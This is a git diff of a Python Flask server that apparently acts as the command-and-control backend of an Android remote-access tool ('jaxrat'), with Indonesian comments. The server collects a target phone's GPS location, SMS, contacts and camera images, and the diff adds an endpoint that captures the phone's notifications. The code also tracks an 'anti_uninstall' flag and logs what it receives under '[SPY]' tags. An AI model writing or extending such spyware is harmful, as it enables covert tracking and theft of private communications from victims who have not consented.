@@ -9,7 +9,7 @@ PASSWORD = "jaxrat123"
 
 devices = {"hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}}
 latest_commands = {"hp_target_1": "none"}
-latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": []}}
+latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": [], "notifs": []}}
 
 UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -60,15 +60,23 @@ def upload_result(device_id):
     if device_id in latest_results:
         if data.get("type") == "gps":
             latest_results[device_id]["gps"] = data.get("data")
-            print(f"[SPY] GPS masuk: {data.get('data')}")
         elif data.get("type") == "sms":
             latest_results[device_id]["sms"] = data.get("data")
-            print(f"[SPY] {len(data.get('data'))} SMS masuk")
         elif data.get("type") == "contacts":
             latest_results[device_id]["contacts"] = data.get("data")
-            print(f"[SPY] {len(data.get('data'))} Kontak masuk")
-        elif data.get("type") == "camera_error":
-            print(f"[ERROR KAMERA] {data.get('data')}")
+    return jsonify({"status": "success"})
+
+# --- ENDPOINT NOTIFIKASI BARU ---
+@app.route('/api/upload_notification/<device_id>', methods=['POST'])
+def upload_notification(device_id):
+    data = request.json
+    if device_id in latest_results:
+        # Simpan maksimal 30 notifikasi terakhir biar gak berat
+        notif_list = latest_results[device_id]["notifs"]
+        notif_list.insert(0, data) # Taruh paling atas (terbaru)
+        if len(notif_list) > 30:
+            notif_list.pop() # Buang yang paling lama
+        print(f"[SPY] Notif masuk dari {data.get('app')}: {data.get('title')}")
     return jsonify({"status": "success"})
 
 @app.route('/api/get_results/<device_id>', methods=['GET'])
@@ -83,17 +91,16 @@ def clear_result(device_id, result_type):
         if result_type == "gps": latest_results[device_id]["gps"] = "Belum ada data"
         elif result_type == "sms": latest_results[device_id]["sms"] = []
         elif result_type == "contacts": latest_results[device_id]["contacts"] = []
+        elif result_type == "notifs": latest_results[device_id]["notifs"] = []
     return jsonify({"status": "success"})
 
 @app.route('/api/upload_image/<device_id>', methods=['POST'])
 def upload_image(device_id):
-    if 'image' not in request.files:
-        return jsonify({"status": "error", "message": "No image part"}), 400
+    if 'image' not in request.files: return jsonify({"status": "error"}), 400
     file = request.files['image']
     if file.filename == '': return jsonify({"status": "error"}), 400
     filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
     file.save(filepath)
-    print(f"[SPY] Gambar baru diterima dari {device_id}!")
     return jsonify({"status": "success"})
 
 if __name__ == '__main__':
